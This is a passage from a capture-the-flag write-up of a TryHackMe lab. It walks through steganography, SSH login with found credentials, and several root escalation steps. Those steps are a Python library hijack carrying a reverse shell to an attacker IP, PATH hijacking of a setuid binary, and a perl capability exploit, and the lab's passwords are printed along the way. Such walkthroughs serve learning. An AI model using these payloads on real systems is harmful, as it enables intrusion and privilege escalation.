```
- On /poem we have The Jabberwocky poem  
![image](https://user-images.githubusercontent.com/96747355/161145799-79de6b1d-0d51-417c-94bd-9538e36b8b73.png)  
- On /r we have nothing interesting
- On /img there are some images
- Let's modify our /etc/hosts and add this `10.10.95.114 wonderland`
- Now we can use gobuster for subdomain enumeration as well (it does not five anything but it was worth a try)
- Let's have a closer look to the images.
- First lets take the rabbit one As it is written pretty much everywhere to follow the white rabbit.
```
â”Œâ”€â”€(rootðŸ’€kali)-[~/Documents/tryhackme/wonderland]
â””â”€# steghide --info white_rabbit_1.jpg         
"white_rabbit_1.jpg":
  format: jpeg
  capacity: 99.2 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "hint.txt":
    size: 22.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```
- It asks for a passphrase but there is no need to enter anything you can just type enter.
- And we can see that a hint is embeded in the image, lets extract it ` steghide --extract -sf white_rabbit_1.jpg`sf will specify it is a stego file.
- Here is the hint
```
â”Œâ”€â”€(rootðŸ’€kali)-[~/Documents/tryhackme/wonderland]
â””â”€# cat hint.txt     
follow the r a b b i t                                                                                                                                                                                                               
```
In our gobuster there was an r directory. So this probably means that `r a b b i t` is a path that we need to **follow** 
- Indeed at each page we get the follow up fo the story `http://wonderland/r/a/b/b/i/t/`  
![image](https://user-images.githubusercontent.com/96747355/161146081-674e96f8-0d60-42e5-8a5c-e9511e534a20.png)  
- If we look at the code of the last page we get what seems to be user:pass:
```
alice:HowDothTheLittleCrocodileImproveHisShiningTail
```
- Let's try those on the ssh. It works:
```
alice@wonderland:~$ 
```
- If we check the hint for the user.txt it says everything is upside down so I tried to find a file called `txt.resu` but it was not it, then I realized as we have the root.txt in alice's folder maybe the user.txt is in a the root so I tried a `cat /root/user.txt` 
- And it worked!
- Let's try to become root

## Privilege Escalation

- If we sudo -l using alice password, we get htis
```
alice@wonderland:~$ sudo -l
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
- If we l0ok at the python script it seems to show 10 of any sentence of the poem randomly
```
for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```
- Having the right to this specific file means that this the way to privesc.
- It seems like we could hijack the python library. I found [this really interesintg article that explains it pretty well](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)
- So our walrus script uses the library random.py. I modified it like this to get a reverse shell and I launched it as the user rabbit this way: `sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`
```
#!/usr/bin/python3
from os import dup2
from subprocess import run
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.13.22.56",8888)) 
dup2(s.fileno(),0) 
dup2(s.fileno(),1) 
dup2(s.fileno(),2) 
run(["/bin/bash","-i"])
```
- And it works we have a shell as rabbit:  
![image](https://user-images.githubusercontent.com/96747355/161157090-1444f291-a4e1-4efc-8373-2706cd00e399.png)  
- With a shell as rabbit we can now have a look at their home folder and we can see this file called teaParty. If we use file on it we get this result:
```
file teaParty
teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped
```
If we launch it it ends with a segfault
```
Probably by Thu, 31 Mar 2022 23:15:41 +0000

Welcome to the tea party!
The Mad Hatter will be here soon.
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
```

- Let's take a look at it from our attacking machine as we do not have a the strings function in the target machine
- we can serve it using http server of python as it is installed in the machine `python3.6 -m http.server 8888`
- And we take it using wget  
![image](https://user-images.githubusercontent.com/96747355/161159311-d81208ba-f7c3-4003-88fc-6d4bf0fb104d.png)  
- When we look at it with strings we see this line:
```
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```
- So date is invoked without using the full path, we could certainly abuse this by putting a file called date and make it do something for us.
- Let's just make it run bash using `/bin/bash`  
![image](https://user-images.githubusercontent.com/96747355/161160256-614b80cc-961a-4eaa-ac3d-bfedf16a90bf.png)  
- Now we serve it from our attacking machine with python and get it in our target
- We have to make it executable with `chmod +x`
- And we need to export rabbit's home as our path 
```
export PATH=/home/rabbit:$PATH
echo $PATH
/home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
```

- And now we can run our binary! And it works  
![image](https://user-images.githubusercontent.com/96747355/161160721-3ceaafc0-f471-4c8a-a62e-30df37f6233c.png)  
- We are the mad hatter!! If we go to his home directory we get his password `WhyIsARavenLikeAWritingDesk?` so we can connect as him using ssh:  
![image](https://user-images.githubusercontent.com/96747355/161160960-8886a779-8272-462f-b804-15015a358b5c.png)  

- There are no specific file that caught our attention and sudo -l does not list anything so let's get linepeas and check out what we could do.
- `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64` we run this in our attacking machine
- We serve it using python server `python3 -m http.server 80`
- We dowload it in our target `wget http://10.13.22.56/linpeas_linux_amd64`
- add it execution right with `chmod +x` and run it ./linpeas_linux_amd64
- We have a 95% PE vector:

- [This article](https://gtfobins.github.io/gtfobins/perl/#capabilities) shows us a way to abuse this I slightly modified the command to use bash instead of sh `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'` and it works!

- We are root and can read our last flag on alice's home!
